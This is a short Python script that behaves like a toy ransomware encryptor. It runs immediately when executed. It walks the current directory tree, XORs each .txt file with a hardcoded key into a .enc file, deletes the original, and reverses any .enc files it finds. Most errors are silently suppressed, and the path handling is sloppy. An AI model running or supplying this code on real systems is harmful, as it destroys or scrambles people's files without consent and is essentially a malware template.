import os

def xor_file(input_file, output_file, key):
    try:
        with open(input_file, 'rb') as file:
            data = file.read()

        key = key.encode()  # Convert the key from string to byte array
        key_length = len(key)
        encrypted_data = bytearray()

        for i, byte in enumerate(data):
            encrypted_byte = byte ^ key[i % key_length]
            encrypted_data.append(encrypted_byte)

        with open(output_file, 'wb') as file:
            file.write(encrypted_data)

        os.remove(input_file)

    except FileNotFoundError:
        #print(f"Error: File not found - {input_file}")
        print("\n")
    except Exception as e:
        print(f"Error: An unexpected error occurred - {str(e)}")


def enumerate_files(start_directory):
    file_paths = []
    i = 0
    j = 0

    for root, directories, files in os.walk(start_directory):
        for filename in files:
            i +=1
            if ".txt" in filename:
                file_paths.append(filename)
                j += 1
            print(f"{i} files scanned, {j} target files found", end='\r')
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    print("\n")
    files_to_return = [*set(file_paths)]
    return files_to_return

def main():
    key = "asuperinsecurekey"
    start_directory = os.getcwd()
    files = enumerate_files(start_directory)
    files_to_encrypt = []

    for file in files:
        if ".txt" in file:
            files_to_encrypt.append(file)
            output_file = os.path.splitext(file)[0] + ".enc"
            xor_file(file, output_file, key)
            
        elif ".enc" in file:
            decrypted_file = os.path.splitext(file)[0] + ".txt"
            xor_file(file, decrypted_file, key)



main()
